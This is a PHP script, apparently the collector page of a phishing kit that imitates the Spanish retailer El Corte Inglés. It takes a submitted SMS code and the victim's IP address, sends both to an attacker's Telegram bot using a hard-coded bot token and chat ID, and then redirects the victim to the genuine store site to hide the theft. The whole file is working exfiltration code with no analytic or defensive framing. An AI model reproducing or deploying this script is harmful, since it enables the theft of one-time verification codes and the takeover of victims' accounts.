<?php
$sms = $_POST['smss'];
$ip = $_SERVER['REMOTE_ADDR'];
$token = "7740157928:AAGUIWCUSCQOBaeyndY7Q5srC6bpTy5tYsg";
$chat_id = "-4696505335";
if ($sms == "")
$txt = '';
    $arr = array(
        'SMS: ' => $sms,
        'IP: ' =>$ip,
    );
    foreach ($arr as $key => $value){
        $txt .= "<b>".$key."</b>".$value."%0A";
    }
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    if($sendToTelegram){
        
    }
header('location:https://www.elcorteingles.es')?>